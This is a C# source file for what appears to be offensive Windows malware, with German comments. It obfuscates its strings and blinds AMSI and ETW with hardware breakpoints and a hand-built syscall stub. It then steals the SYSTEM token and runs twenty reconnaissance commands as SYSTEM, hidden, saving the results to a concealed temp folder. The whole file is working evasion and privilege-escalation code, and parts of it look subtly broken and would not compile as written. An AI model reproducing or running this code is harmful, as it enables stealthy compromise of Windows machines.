using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;

namespace TokenTheftPayload
{
    #region String Obfuscation (XOR + Base64)
    public static class StringObfuscator
    {
        private static readonly byte[] _xorKey = GenerateXorKey();
        
        private static byte[] GenerateXorKey()
        {
            string seed = Environment.MachineName.Length.ToString() + 
                         Environment.ProcessorCount.ToString() +
                         DateTime.Now.DayOfYear.ToString();
            byte[] key = new byte[8];
            for (int i = 0; i < 8; i++)
                key[i] = (byte)(seed[i % seed.Length] ^ 0xAA);
            return key;
        }
        
        public static string Obfuscate(string input)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= _xorKey[i % _xorKey.Length];
            return Convert.ToBase64String(bytes);
        }
        
        public static string Deobfuscate(string input)
        {
            byte[] bytes = Convert.FromBase64String(input);
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] ^= _xorKey[i % _xorKey.Length];
            return Encoding.UTF8.GetString(bytes);
        }
    }
    
    public static class ObfuscatedStrings
    {
        // DLL-Namen
        public static readonly string Ntdll = StringObfuscator.Obfuscate("ntdll.dll");
        public static readonly string Amsi = StringObfuscator.Obfuscate("amsi.dll");
        public static readonly string Kernel32 = StringObfuscator.Obfuscate("kernel32.dll");
        public static readonly string Advapi32 = StringObfuscator.Obfuscate("advapi32.dll");
        
        // API-Namen
        public static readonly string NtContinue = StringObfuscator.Obfuscate("NtContinue");
        public static readonly string NtCreateFile = StringObfuscator.Obfuscate("NtCreateFile");
        public static readonly string AmsiScanBuffer = StringObfuscator.Obfuscate("AmsiScanBuffer");
        public static readonly string EtwEventWrite = StringObfuscator.Obfuscate("EtwEventWrite");
        public static readonly string SeDebugPrivilege = StringObfuscator.Obfuscate("SeDebugPrivilege");
        
        // Prozessnamen
        public static readonly string Explorer = StringObfuscator.Obfuscate("explorer");
        
        // Die 20 Befehle (verschlüsselt)
        public static readonly string[] EncryptedCommands = new string[]
        {
            StringObfuscator.Obfuscate("systeminfo"),
            StringObfuscator.Obfuscate("hostname"),
            StringObfuscator.Obfuscate("whoami"),
            StringObfuscator.Obfuscate("whoami /priv"),
            StringObfuscator.Obfuscate("whoami /groups"),
            StringObfuscator.Obfuscate("ipconfig /all"),
            StringObfuscator.Obfuscate("netstat -an"),
            StringObfuscator.Obfuscate("netstat -ano"),
            StringObfuscator.Obfuscate("route print"),
            StringObfuscator.Obfuscate("arp -a"),
            StringObfuscator.Obfuscate("net user"),
            StringObfuscator.Obfuscate("net localgroup"),
            StringObfuscator.Obfuscate("net group /domain"),
            StringObfuscator.Obfuscate("net accounts"),
            StringObfuscator.Obfuscate("tasklist"),
            StringObfuscator.Obfuscate("tasklist /svc"),
            StringObfuscator.Obfuscate("sc query state= all"),
            StringObfuscator.Obfuscate("wmic service list brief"),
            StringObfuscator.Obfuscate("auditpol /get /category:*"),
            StringObfuscator.Obfuscate("wmic qfe list brief /format:table")
        };
        
        // Befehlsnamen für Dateien
        public static readonly string[] EncryptedCommandNames = new string[]
        {
            StringObfuscator.Obfuscate("01_Systeminfo"),
            StringObfuscator.Obfuscate("02_Hostname"),
            StringObfuscator.Obfuscate("03_Whoami"),
            StringObfuscator.Obfuscate("04_Privileges"),
            StringObfuscator.Obfuscate("05_Groups"),
            StringObfuscator.Obfuscate("06_IPConfig"),
            StringObfuscator.Obfuscate("07_Netstat_All"),
            StringObfuscator.Obfuscate("08_Netstat_PIDs"),
            StringObfuscator.Obfuscate("09_Route_Table"),
            StringObfuscator.Obfuscate("10_ARP_Table"),
            StringObfuscator.Obfuscate("11_Local_Users"),
            StringObfuscator.Obfuscate("12_Local_Groups"),
            StringObfuscator.Obfuscate("13_Domain_Groups"),
            StringObfuscator.Obfuscate("14_Account_Policies"),
            StringObfuscator.Obfuscate("15_Processes"),
            StringObfuscator.Obfuscate("16_Processes_Services"),
            StringObfuscator.Obfuscate("17_Services"),
            StringObfuscator.Obfuscate("18_Services_WMIC"),
            StringObfuscator.Obfuscate("19_Audit_Policies"),
            StringObfuscator.Obfuscate("20_Hotfixes")
        };
    }
    #endregion

    #region Native Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags, MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15, Rip;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_RECORD
    {
        public uint ExceptionCode, ExceptionFlags;
        public IntPtr ExceptionRecord, ExceptionAddress;
        public uint NumberParameters;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
        public ulong[] ExceptionInformation;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct EXCEPTION_POINTERS
    {
        public IntPtr ExceptionRecord, ContextRecord;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    #endregion

    #region Constants
    public static class Consts
    {
        public const uint CONTEXT_DEBUG_REGISTERS = 0x10010;
        public const uint STATUS_SINGLE_STEP = 0x80000004;
        public const uint EXCEPTION_CONTINUE_EXECUTION = 0xFFFFFFFF;
        public const uint EXCEPTION_CONTINUE_SEARCH = 0x0;
        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;
        public const uint TOKEN_DUPLICATE = 0x0002;
        public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        public const uint TOKEN_QUERY = 0x0008;
        public const uint TOKEN_ALL_ACCESS = 0xF01FF;
        public const int TokenPrimary = 1;
        public const int SecurityImpersonation = 2;
        public const uint SE_PRIVILEGE_ENABLED = 0x2;
        public const uint SW_HIDE = 0;
        public const uint STARTF_USESTDHANDLES = 0x00000100;
        public const uint STARTF_USESHOWWINDOW = 0x00000001;
        public const uint CREATE_NO_WINDOW = 0x08000000;
        public const int BUFFER_SIZE = 65536;
        public const int WAIT_TIMEOUT = 30000;
    }
    #endregion

    #region Native Imports (mit verschleierten DLL-Namen)
    public class NativeMethods
    {
        private static string KERNEL32 => StringObfuscator.Deobfuscate(ObfuscatedStrings.Kernel32);
        private static string NTDLL => StringObfuscator.Deobfuscate(ObfuscatedStrings.Ntdll);
        private static string ADVAPI32 => StringObfuscator.Deobfuscate(ObfuscatedStrings.Advapi32);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreatePipe(out SafeFileHandle hReadPipe, out SafeFileHandle hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(SafeFileHandle hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr AddVectoredExceptionHandler(uint FirstHandler, IntPtr Handler);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool RemoveVectoredExceptionHandler(IntPtr Handler);

        [DllImport("user32.dll")]
        public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtContinue(ref CONTEXT Context, int TestAlert);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    }
    #endregion

    #region HellsHall + NtContinue Patchless Bypass
    public class PatchlessBypass
    {
        private struct SYSCALL_INFO
        {
            public uint SSN;
            public IntPtr SyscallInstruction;
        }

        private static SYSCALL_INFO ntcontinueInfo;
        private static IntPtr vehHandle;
        private static IntPtr amsiAddr;
        private static IntPtr etwAddr;

        private static unsafe IntPtr FindSyscallInstruction(IntPtr functionAddress)
        {
            byte* addr = (byte*)functionAddress.ToPointer();
            for (int i = 0; i < 32; i++)
                if (addr[i] == 0x0F && addr[i + 1] == 0x05)
                    return new IntPtr(addr + i);
            return IntPtr.Zero;
        }

        private static unsafe uint GetSyscallNumber(IntPtr functionAddress)
        {
            byte* addr = (byte*)functionAddress.ToPointer();
            if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8)
                return *(uint*)(addr + 4);
            return 0;
        }

        private static SYSCALL_INFO ResolveNtContinue()
        {
            SYSCALL_INFO info = new SYSCALL_INFO();
            string ntdllName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Ntdll);
            string ntContinueName = StringObfuscator.Deobfuscate(ObfuscatedStrings.NtContinue);

            IntPtr ntdll = NativeMethods.GetModuleHandle(ntdllName);
            if (ntdll == IntPtr.Zero) ntdll = NativeMethods.LoadLibrary(ntdllName);

            IntPtr funcAddr = NativeMethods.GetProcAddress(ntdll, ntContinueName);
            if (funcAddr == IntPtr.Zero) return info;

            info.SSN = GetSyscallNumber(funcAddr);
            info.SyscallInstruction = FindSyscallInstruction(funcAddr);

            if (info.SyscallInstruction == IntPtr.Zero)
            {
                string ntCreateName = StringObfuscator.Deobfuscate(ObfuscatedStrings.NtCreateFile);
                IntPtr otherFunc = NativeMethods.GetProcAddress(ntdll, ntCreateName);
                info.SyscallInstruction = FindSyscallInstruction(otherFunc);
            }
            return info;
        }

        private static unsafe int InvokeNtContinue(ref CONTEXT context, int testAlert)
        {
            byte[] stubCode = new byte[]
            {
                0x4C, 0x8B, 0xD1, 0xB8,
                (byte)(ntcontinueInfo.SSN & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 8) & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 16) & 0xFF),
                (byte)((ntcontinueInfo.SSN >> 24) & 0xFF),
                0x48, 0xB8,
                (byte)((ulong)ntcontinueInfo.SyscallInstruction & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 8) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 16) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 24) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 32) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 40) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 48) & 0xFF),
                (byte)(((ulong)ntcontinueInfo.SyscallInstruction >> 56) & 0xFF),
                0xFF, 0xE0, 0xC3
            };

            IntPtr stubMemory = NativeMethods.VirtualAlloc(IntPtr.Zero, (uint)stubCode.Length, 0x1000, 0x40);
            if (stubMemory == IntPtr.Zero) return NativeMethods.NtContinue(ref context, testAlert);

            Marshal.Copy(stubCode, 0, stubMemory, stubCode.Length);
            delegate* unmanaged<ref CONTEXT, int, int> stubDelegate = (delegate* unmanaged<ref CONTEXT, int, int>)stubMemory;
            int result = stubDelegate(ref context, testAlert);
            return result;
        }

        public static bool Initialize()
        {
            ntcontinueInfo = ResolveNtContinue();
            if (ntcontinueInfo.SSN == 0) return false;

            RegisterExceptionHandler();
            SetHardwareBreakpoints();
            return true;
        }

        private static void SetHardwareBreakpoints()
        {
            string amsiName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Amsi);
            string amsiFunc = StringObfuscator.Deobfuscate(ObfuscatedStrings.AmsiScanBuffer);
            string etwFunc = StringObfuscator.Deobfuscate(ObfuscatedStrings.EtwEventWrite);

            IntPtr amsi = NativeMethods.LoadLibrary(amsiName);
            amsiAddr = NativeMethods.GetProcAddress(amsi, amsiFunc);

            string ntdllName = StringObfuscator.Deobfuscate(ObfuscatedStrings.Ntdll);
            IntPtr ntdll = NativeMethods.GetModuleHandle(ntdllName);
            etwAddr = NativeMethods.GetProcAddress(ntdll, etwFunc);

            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Consts.CONTEXT_DEBUG_REGISTERS;

            if (amsiAddr != IntPtr.Zero) ctx.Dr0 = (ulong)amsiAddr;
            if (etwAddr != IntPtr.Zero) ctx.Dr1 = (ulong)etwAddr;
            ctx.Dr7 = (amsiAddr != IntPtr.Zero ? 0x1 : 0) | (etwAddr != IntPtr.Zero ? 0x4 : 0);

            InvokeNtContinue(ref ctx, 0);
        }

        private static void RegisterExceptionHandler()
        {
            var del = new VectoredExceptionDelegate(Handler);
            IntPtr ptr = Marshal.GetFunctionPointerForDelegate(del);
            vehHandle = NativeMethods.AddVectoredExceptionHandler(1, ptr);
            GC.KeepAlive(del);
        }

        private delegate uint VectoredExceptionDelegate(IntPtr exceptionPointers);

        private static uint Handler(IntPtr exceptionPointers)
        {
            EXCEPTION_POINTERS ep = Marshal.PtrToStructure<EXCEPTION_POINTERS>(exceptionPointers);
            EXCEPTION_RECORD er = Marshal.PtrToStructure<EXCEPTION_RECORD>(ep.ExceptionRecord);

            if (er.ExceptionCode == Consts.STATUS_SINGLE_STEP)
            {
                CONTEXT ctx = Marshal.PtrToStructure<CONTEXT>(ep.ContextRecord);

                if ((amsiAddr != IntPtr.Zero && ctx.Rip == (ulong)amsiAddr) ||
                    (etwAddr != IntPtr.Zero && ctx.Rip == (ulong)etwAddr))
                {
                    ctx.Rax = 0x00000000;
                    ctx.Rip = FindRetGadget(ctx.Rip);
                    ctx.EFlags |= (1 << 16);
                    Marshal.StructureToPtr(ctx, ep.ContextRecord, false);
                    return Consts.EXCEPTION_CONTINUE_EXECUTION;
                }
            }
            return Consts.EXCEPTION_CONTINUE_SEARCH;
        }

        private static unsafe ulong FindRetGadget(ulong nearAddress)
        {
            byte* addr = (byte*)nearAddress;
            for (int i = 0; i < 0x10000; i++)
                if (addr[i] == 0xC3) return nearAddress + (ulong)i;
            return nearAddress + 5;
        }

        public static void Cleanup()
        {
            if (vehHandle != IntPtr.Zero) NativeMethods.RemoveVectoredExceptionHandler(vehHandle);
            CONTEXT ctx = new CONTEXT();
            ctx.ContextFlags = Consts.CONTEXT_DEBUG_REGISTERS;
            ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr7 = 0;
            InvokeNtContinue(ref ctx, 0);
        }
    }
    #endregion

    #region Command Executor mit Pipeline (kein CMD Fenster, SYSTEM Token)
    public class SystemCommandExecutor
    {
        public static string Execute(string command, IntPtr systemToken)
        {
            using (var stdoutPipe = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable))
            using (var stderrPipe = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable))
            {
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf(sa);
                sa.bInheritHandle = true;
                sa.lpSecurityDescriptor = IntPtr.Zero;

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.dwFlags = Consts.STARTF_USESTDHANDLES | Consts.STARTF_USESHOWWINDOW;
                si.wShowWindow = Consts.SW_HIDE;
                si.hStdOutput = stdoutPipe.ClientSafePipeHandle.DangerousGetHandle();
                si.hStdError = stderrPipe.ClientSafePipeHandle.DangerousGetHandle();
                si.hStdInput = NativeMethods.GetCurrentProcess();

                stdoutPipe.ClientSafePipeHandle.Close();
                stderrPipe.ClientSafePipeHandle.Close();

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                string cmdLine = "/c " + command;

                bool success = NativeMethods.CreateProcessAsUserW(
                    systemToken,
                    null,
                    cmdLine,
                    ref sa,
                    ref sa,
                    true,
                    Consts.CREATE_NO_WINDOW,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );

                if (!success)
                    return "[ERROR] Process creation failed";

                pi.hThread.Close();

                // Output auslesen
                StringBuilder output = new StringBuilder();
                byte[] buffer = new byte[Consts.BUFFER_SIZE];
                uint bytesRead;

                using (var stdoutReader = new StreamReader(stdoutPipe))
                using (var stderrReader = new StreamReader(stderrPipe))
                {
                    stdoutPipe.ReadTimeout = Consts.WAIT_TIMEOUT;
                    stderrPipe.ReadTimeout = Consts.WAIT_TIMEOUT;
                    try { output.Append(stdoutReader.ReadToEnd()); } catch { }
                    try { output.Append(stderrReader.ReadToEnd()); } catch { }
                }

                NativeMethods.WaitForSingleObject(pi.hProcess, (uint)Consts.WAIT_TIMEOUT);
                pi.hProcess.Close();

                return output.ToString();
            }
        }
    }
    #endregion

    #region Token Theft (SYSTEM Token stehlen)
    public class TokenStealer
    {
        public static IntPtr GetSystemToken()
        {
            EnableDebugPrivilege();

            // SYSTEM Prozess (PID 4) öffnen
            IntPtr systemProcess = NativeMethods.OpenProcess(
                Consts.PROCESS_QUERY_INFORMATION | Consts.PROCESS_VM_READ,
                false,
                4
            );

            if (systemProcess == IntPtr.Zero)
                return IntPtr.Zero;

            // Token von SYSTEM öffnen
            if (!NativeMethods.OpenProcessToken(systemProcess, Consts.TOKEN_DUPLICATE | Consts.TOKEN_QUERY, out IntPtr systemToken))
            {
                NativeMethods.CloseHandle(systemProcess);
                return IntPtr.Zero;
            }

            // Token duplizieren für aktuellen Prozess
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(sa);
            sa.bInheritHandle = false;

            if (!NativeMethods.DuplicateTokenEx(systemToken, Consts.TOKEN_ALL_ACCESS, ref sa, Consts.SecurityImpersonation, Consts.TokenPrimary, out IntPtr duplicatedToken))
            {
                NativeMethods.CloseHandle(systemToken);
                NativeMethods.CloseHandle(systemProcess);
                return IntPtr.Zero;
            }

            NativeMethods.CloseHandle(systemToken);
            NativeMethods.CloseHandle(systemProcess);

            return duplicatedToken;
        }

        private static void EnableDebugPrivilege()
        {
            string seDebug = StringObfuscator.Deobfuscate(ObfuscatedStrings.SeDebugPrivilege);

            if (!NativeMethods.OpenProcessToken(NativeMethods.GetCurrentProcess(), Consts.TOKEN_ALL_ACCESS, out IntPtr token))
                return;

            NativeMethods.LookupPrivilegeValue(null, seDebug, out LUID luid);

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privileges.Luid = luid;
            tp.Privileges.Attributes = Consts.SE_PRIVILEGE_ENABLED;

            NativeMethods.AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            NativeMethods.CloseHandle(token);
        }
    }
    #endregion

    #region Hauptprogramm - 20 Befehle mit SYSTEM Rechten
    class Program
    {
        static void Main(string[] args)
        {
            // 1. HellsHall + NtContinue Bypass aktivieren
            PatchlessBypass.Initialize();

            // 2. Output Verzeichnis erstellen (versteckt im Temp)
            string outputDir = Path.Combine(Path.GetTempPath(), $"sys_{Environment.MachineName}_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(outputDir);
            File.SetAttributes(outputDir, FileAttributes.Hidden);

            // 3. SYSTEM Token stehlen
            IntPtr systemToken = TokenStealer.GetSystemToken();
            
            if (systemToken == IntPtr.Zero)
            {
                // Fallback: Eigenen Token verwenden (keine SYSTEM-Rechte)
                systemToken = IntPtr.Zero;
            }

            // 4. Befehle deobfuscieren
            string[] commands = new string[ObfuscatedStrings.EncryptedCommands.Length];
            string[] commandNames = new string[ObfuscatedStrings.EncryptedCommandNames.Length];

            for (int i = 0; i < ObfuscatedStrings.EncryptedCommands.Length; i++)
            {
                commands[i] = StringObfuscator.Deobfuscate(ObfuscatedStrings.EncryptedCommands[i]);
                commandNames[i] = StringObfuscator.Deobfuscate(ObfuscatedStrings.EncryptedCommandNames[i]);
            }

            // 5. Summary Datei
            string summaryFile = Path.Combine(outputDir, "00_SUMMARY.txt");
            StringBuilder summary = new StringBuilder();
            summary.AppendLine("=== SYSTEM ENUMERATION REPORT ===");
            summary.AppendLine($"Computer: {Environment.MachineName}");
            summary.AppendLine($"User: {Environment.UserName}");
            summary.AppendLine($"OS: {Environment.OSVersion}");
            summary.AppendLine($"Time: {DateTime.Now}");
            summary.AppendLine($"Token: {(systemToken != IntPtr.Zero ? "SYSTEM" : "Current User")}");
            summary.AppendLine($"Output Directory: {outputDir}");
            summary.AppendLine(new string('=', 80));
            summary.AppendLine();

            // 6. Alle 20 Befehle ausführen
            for (int i = 0; i < commands.Length; i++)
            {
                string command = commands[i];
                string cmdName = commandNames[i];
                string outputFile = Path.Combine(outputDir, $"{cmdName}.txt");

                try
                {
                    summary.AppendLine($"[{DateTime.Now:HH:mm:ss}] Executing: {command}");
                    
                    string result = SystemCommandExecutor.Execute(command, systemToken);
                    File.WriteAllText(outputFile, result, Encoding.UTF8);
                    
                    int resultLen = result.Length;
                    string preview = result.Length > 200 ? result.Substring(0, 200) + "..." : result.Replace("\n", " ").Replace("\r", "");
                    summary.AppendLine($"  -> Output: {resultLen} bytes");
                    summary.AppendLine($"  -> Preview: {preview}");
                    summary.AppendLine();
                }
                catch (Exception ex)
                {
                    File.WriteAllText(outputFile, $"[ERROR] {ex.Message}");
                    summary.AppendLine($"  -> ERROR: {ex.Message}");
                    summary.AppendLine();
                }
                
                Thread.Sleep(500);
            }

            // 7. Summary speichern
            summary.AppendLine(new string('=', 80));
            summary.AppendLine($"Enumeration completed: {DateTime.Now}");
            summary.AppendLine($"Total files: {commands.Length}");
            summary.AppendLine($"Output directory: {outputDir}");
            File.WriteAllText(summaryFile, summary.ToString(), Encoding.UTF8);

            // 8. Gesamtdatei
            string allResultsFile = Path.Combine(outputDir, "00_ALL_RESULTS.txt");
            StringBuilder allResults = new StringBuilder();
            foreach (var cmdName in commandNames)
            {
                string file = Path.Combine(outputDir, $"{cmdName}.txt");
                if (File.Exists(file))
                {
                    allResults.AppendLine(new string('=', 80));
                    allResults.AppendLine($"=== {cmdName} ===");
                    allResults.AppendLine(new string('-', 80));
                    allResults.AppendLine(File.ReadAllText(file));
                    allResults.AppendLine();
                }
            }
            File.WriteAllText(allResultsFile, allResults.ToString(), Encoding.UTF8);

            // 9. Cleanup
            PatchlessBypass.Cleanup();
            if (systemToken != IntPtr.Zero)
                NativeMethods.CloseHandle(systemToken);

            // 10. Beenden - keine Fenster, keine Ausgabe
            Environment.Exit(0);
        }
    }
    #endregion
}